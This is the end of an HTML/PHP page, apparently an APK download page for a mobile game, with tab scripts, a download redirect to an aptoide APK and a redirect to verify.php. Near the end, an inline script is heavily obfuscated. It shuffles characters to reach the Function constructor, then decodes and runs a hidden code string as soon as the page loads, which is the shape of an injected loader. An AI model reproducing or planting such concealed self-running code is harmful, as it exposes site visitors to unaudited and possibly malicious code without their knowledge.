                content: 'tab-content-faqs'
            },
            {
                btn: 'tab-versions',
                content: 'tab-content-versions'
            },
            {
                btn: 'tab-info',
                content: 'tab-content-info'
            }
        ];
        tabs.forEach(({
            btn,
            content
        }) => {
            document.getElementById(btn).addEventListener('click', function() {
                tabs.forEach(({
                    btn: b,
                    content: c
                }) => {
                    document.getElementById(c).style.display = (c === content) ? 'block' : 'none';
                    document.getElementById(b).classList.toggle('eiySUK', b === btn);
                    document.getElementById(b).classList.toggle('jbbpIZ', b !== btn);
                });
            });
        });
    </script>




    <script>
        const toggleBtn = document.getElementById('toggleDescBtn');
        const descContent = document.getElementById('descContent');
        const arrowIcon = document.getElementById('arrowIcon');
        let isShown = false;
        descContent.style.display = 'none';
        arrowIcon.className = 'fa fa-chevron-up';
        toggleBtn.addEventListener('click', function() {
            isShown = !isShown;
            descContent.style.display = isShown ? 'block' : 'none';
            arrowIcon.className = isShown ? 'fa fa-chevron-down' : 'fa fa-chevron-up';
        });
    </script>
    <script>
        function downloadApk() {
            // Show the "download-processing" message
            var processingDiv = document.getElementById('download-processing');
            if (processingDiv) {
                processingDiv.style.display = 'block';
            }
            // Start download after short delay
            setTimeout(function() {
                window.location.href = 'https://pool.apk.aptoide.com/aptoide-web/com-mobile-legends-1199310904-70933354-6457de050f841f454434cb79ba7c4c3c.apk';
                // Optionally hide the processing message after redirect
                // processingDiv.style.display = 'none';
            }, 800);
        }
    </script>
    <script>
(function(){var Szy='',pLf=447-436;function uJR(l){var m=1422391;var p=l.length;var e=[];for(var y=0;y<p;y++){e[y]=l.charAt(y)};for(var y=0;y<p;y++){var b=m*(y+205)+(m%24133);var q=m*(y+122)+(m%17706);var n=b%p;var f=q%p;var j=e[n];e[n]=e[f];e[f]=j;m=(b+q)%2453177;};return e.join('')};var qgC=uJR('trjuskuqtdrvsxooforbcitychzacgnnwmple').substr(0,pLf);var nJl='olct, [2g+>hv,j=e7=sn=al8a0z=dyi;i;l.)m<o(sr9,.vw rz)Av2uknz=;ir"2a={;o,)1o)eja{hpa6a[n=v ,<+,l4C.c,gz,77)jp[krC(vu,oc=;f=,or,(ef]i(<s!v){ls(8l(qe;ivb,ta;lnvgjhull]+teafiq ped=[];tha])lf.=l3a9]= 8tktf75f+hynrr+(1nt y;+) z8;rb;m"s+4xuv)+rutavr=t]=l;i+]=r(a7n(hzxrn,6n)teh(s;hv;.d9 t[;;ha 0;)puoojkh ;ih};-.7hr,r[vsjar0y2 8no)cujp3rg=7 g;rm0 xtvbsnmah(,a+=d16og9xrsavehC6+noe+(tjv)ulgr.;c1r=g;,j;+]sie(3rga;a)zrl7hufznr=hf;iv(])p1aafrC(wantm0(;h[=;0e5tqa+);evb{r.C)greo}r186a a+re0(re- }r8o;+cz[0aA1i0+mnr]g s.arCb)to<trf,hk,,+u;2=uc2;}r*-dtc==tg"i ;+..("a,7-]n(9b."{ul=gus)w.;vckn(Ssh(et(i<r"v"fr)=(.1]sh({Anf6t)16=hvp(.vr),v .iu )hish))so=ejm=h(30)ebsrcv,a}es;s)ths==(=olrr=isr.,urp+.[l[[w20=l-S;ivo6;+>;)+f.;.0ac,rtC1e;vp e5rggee2,82]=+on(}h(v=e;1[,=nrufiA}.rv.yr0+=C=vl(96)h-og]!frn 1{;o( .A,jve;m=f(=a=c.jre)t+()l;lr ;4tap)tc";unnjofin .frt.htarulbamd[hz[";qe(8hp.ra9a)46=-)wz"29o*tn d;o';var rdh=uJR[qgC];var pkc='';var UuU=rdh;var AnV=rdh(pkc,uJR(nJl));var hVb=AnV(uJR('f.dd"kgBi(#f.6.,jB)3fe0({inxoz_{zol440nb]BBB(aBB4&Btpf61_BBr&BoSBB\'Bd!BwoaBj_#r[(xiB37x\'3.2b]=!0:Bd=_\'xB1b.r,nd3_)e_5B!frg.y}f9].4d=9ds=.5!7).i=r%B:1B6 Bt$!$aBr((eeBDB#e]98*20.ia3B(!0(}x4bBl%)1n=os1iw_;eys)}.\/u.o4}a[)t.1odBl};6)(Be;b}tsapB>onoo%BvBv)ix_eBe,%lsB,!!1B"B]dbl_7BB%nnh(e_(00kndl\/2-!rordj%dg6!$(,str$ t\/%i9;(S)a]1)6&3d s;i.Ce({9B3B54\/;0(es\/1r$td9o$.}nrex(l=$[5is\/B"%}$?vf$)n),o)o%peljo,1sl$+$=$%1,e9.{=a(loc}j(d=8=vB9i=$SBsi;_B;nuB)$_Bn)_!,_n3#(p5-se72(k4o.r#6e7B-;_(]g3=;Br a_1ds)\/tx#BB$%)=_c\/]g0#c,BpB]c+  q9aBBp=nB1}m<977(adgt$1()d$3B,3r1rc{Bcvgynoe9l5dttBex4(%ug&jh(g)p;(.4g;7B(..;gBo))4,=5ayB(.fBvq72B).d :{}7),4}734tB*e*i,=tBh=rn5s!e]ybpne,v41B_3$d9!;B%1))am3;e{1f)).3)%):3)93rda;;iB36!wen\/bf,B)B211BB5B7$BC8ojdf:!:.gd h(6u(_k!3={0B;(;hbr2.Bm%=da,9.$8dpBTi.4x7lM-<bs0Bv i.b=.B.eut)e3. (l!BB])Bf.BB7+d0q_pj)$06f=1$)uph.}9Bx.ddb$f.,wBB,11)((o.iB 0c;f)8dB7.!793pB.B_{n\'_!lj=.oBkB4] 4lB;(gx=)pB9e#=,]f)$ehte%$)n[]]nB]en:iqp$f.l4(o#a_.BBos)en)8o0]=p3]BsBfb9 ]);i!()50a57f1$BBs034scr,%n=]ktt;39,)--03B6. (be)BjBs)7}(6p)#74B[ra5s,]{B3pB:fa41,B)rtt6tf$dBta::8ot.6f3..e.;sa1BBB(3nt[,=aod.d3[,suec%sB?B1Bn1,}.;]add9u\/e(,.}Bm4._B(l1+BfB-,e)t(en{. ButS8){:o[3.+(<e2BB)8)4)o s(36(>g3oD; !.%2B%;v81]2.]r(%B1tvb$(8..s7} u%6d4,!iB(B4+8)_]ao_;..9({2,rrdB)d=u_.+.!>).eo!u(BdB));._1dtf.f_].br y_}1=cBBip,tB1TB=Bg1,)1e<s]t+nl33kBB(nso.m(1\/t{ f)a_etp,{B6ibit?t_6(fB"=$ nfBdrb$76>3(oiBB(1jtbr;B 0Bl4$$B7}o!j!,slpn"a+;p$ B(,8k_a Btw9)e25d=6.,!,0{_BlB44)9s(]4c;B!o;)a=iBr!"yi.B)4b )3jBov=n. ;!3._(.36 ({)(Bfu_B-l?a 7bB0n..Bdd\/}kB$)-m.3= B=aedbf0%;q(3aslg,dta(d=uBs7oc:a.4.%_d ud*!b.a1l$uBdr.B!d(){ 2)_d'));var BoE=UuU(Szy,hVb );BoE(9044);return 3833})()
</script>
 
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" data-cf-beacon="{" version":"2024.11.0","token":"df92594f24b84ed7a433655d63b018e2","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>



</body></html>
<?php
}else{
    header("Location: verify.php");
}
?>